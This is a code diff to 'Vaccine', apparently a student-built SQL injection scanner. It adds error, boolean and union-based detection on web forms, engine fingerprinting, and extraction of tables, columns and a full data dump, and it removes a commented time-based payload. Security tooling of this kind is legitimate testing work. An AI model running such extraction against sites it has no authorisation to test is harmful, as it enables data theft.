@@ -20,6 +20,7 @@ class Vaccine:
         self.max_depth = 1
         self.url_done = []
         self.forms = []
+        self.vul = False
 
         i = 0
         while i < len(args):
@@ -148,18 +149,21 @@ class Vaccine:
     def check_vulnerability(self):
         ''' Check different vulnerabilities '''
         if not self.forms:
-            self.add_report(f"NO FORMS FOUND WITH{self.request}")
+            self.add_report(f"NO FORMS FOUND WITH {self.request}")
             return
 
-        # Error-based
-
+        # Error
         query = Query.checks['error'][0]
         for form in self.forms:
             responses = self.check_all_inputs(form, query)
             for res in responses:
                 if res['response'].status_code == 500:
                     form.vul = True
-                    list(filter({form.inputs['name'] == res['input']}, form.inputs))[0]['vul'].append("error")
+                    self.vul = True
+                    for inp in form.inputs:
+                        if inp['name'] == res['input']:
+                            inp['vul'].append("error")
+                            break
         
         # Boolean
         true_query = Query.checks['boolean'][0]
@@ -170,9 +174,11 @@ class Vaccine:
             for true_res, false_res in zip(true_responses, false_responses):
                 if len(true_res['response'].text) != len(false_res['response'].text):
                     form.vul = True
-                    list(filter({form.inputs['name'] == res['input']}, form.inputs))[0]['vul'].append("boolean")
-
-
+                    self.vul = True
+                    for inp in form.inputs:
+                        if inp['name'] == true_res['input']:
+                            inp['vul'].append("boolean")
+                            break
         # Union
         one_query = Query.checks['error'][0]
         two_query = Query.checks['union'][1]
@@ -185,16 +191,13 @@ class Vaccine:
                 for one, two, three in zip(one_responses, two_responses, three_responses):
                     if len(one['response'].text) != len(two['response'].text) or len(one['response'].text) != len(three['response'].text):
                         form.vul = True
+                        self.vul = True
                         for input_field in form.inputs:
                             if input_field['name'] == one['input']:
                                 input_field['vul'].append("union")
                                 break
 
         self.report_vulnerability()
-        # Time-based
-        # TODO
-        # query =  "1' AND SLEEP(5)--"
-
     
     def report_vulnerability(self):
         self.add_report("=" * 70)
@@ -210,6 +213,9 @@ class Vaccine:
         
         for form in self.forms:
             self.add_report(f"== Form tested: {form.action}\n")
+            if not form.vul:
+                self.add_report(f"NO VULNERABILITY FOUND\n")
+                continue
             table = PrettyTable()
             list_check = list(Query.checks.keys())
             list_check.insert(0, "Input")
@@ -223,6 +229,72 @@ class Vaccine:
             self.add_report(str(table))
             self.add_report("\n")
 
+    def run_query(self, form, query):
+        for input in form.inputs:
+            data = {inp['name']: inp['value'] or 'test' for inp in form.inputs}
+            if "union" in input['vul']:
+                data[input['name']] = query
+                try:
+                    return self.send(form.url, data).text
+                except:
+                    return None
+        return None
+
+    def check_version(self):
+        if not self.vul:
+            return None
+
+        for db, query in Query.versions.items():
+            for form in self.forms:
+                if not form.vul:
+                    continue
+                response = self.run_query(form, query)
+                if db.lower() in response.lower():
+                    return db
+        return None
+                    
+    def extract_infos(self):
+        engine = self.check_version()
+
+        if not self.vul:
+            return
+        self.add_report("=" * 70)
+        self.add_report("DATA EXTRACTION".center(70))
+        self.add_report("=" * 70 + "\n")
+
+        if not engine:
+            self.add_report("==> UNKNOWN ENGINE, NO EXTRACTION POSSIBLE")
+            return
+
+        self.add_report(f"==> ENGINE: {engine}\n")
+
+        tables = None
+        columns = None
+        dump = None
+        for form in self.forms:
+            if tables and columns:
+                break
+            if not form.vul:
+                continue
+            if not tables:
+                tables = self.run_query(form, Query.tables[engine])
+            if not columns:
+                columns = self.run_query(form, Query.columns[engine])
+            if not dump:
+                dump = self.run_query(form, Query.dump[engine])
+        
+        self.add_report(f"==> TABLES\n")
+        tables = tables if tables else "No Table extracted"
+        self.add_report(tables[:1000] + "\n")
+
+        self.add_report(f"==> COLUMNS\n")
+        columns = columns if columns else "No Columns extracted"
+        self.add_report(columns[:1000] + "\n")
+
+        self.add_report(f"==> FULL DUMP\n")
+        dump = dump if dump else "No Full Dump extracted"
+        self.add_report(dump[:1000] + "\n")
+        
     def __str__(self):
         return (f"Vaccine:\n  * URL:      {self.url}\n\
   * Request:  {self.request}\n * Archive:  {self.archive}")
